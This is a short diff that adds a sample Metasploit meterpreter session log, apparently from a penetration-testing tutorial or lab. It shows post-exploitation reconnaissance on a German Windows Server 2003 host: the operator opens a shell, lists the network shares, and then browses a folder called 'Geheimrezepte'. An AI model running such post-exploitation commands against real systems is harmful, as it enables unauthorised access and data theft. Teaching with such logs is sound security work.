@@ -1,0 +1,23 @@
+meterpreter > shell
+
+Process 1760 created.
+Channel 1 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32 > net share
+net share
+
+Name            Ressource       Beschreibung
+----------------------------------------------------
+
+IPC$                            Remote-IPC
+ADMIN$          C:\WINDOWS      Remoteverwaltung
+C$              C:\             Standardfreigabe
+Geheimrezepte   C:\Geheimrezepte
+public          C:\public       Öffentlicher Ordner
+
+Der Befehl wurde erfolgreich ausgeführt.
+
+C:\WINDOWS\system32 > exit
+meterpreter > ls C:\\Geheimrezepte
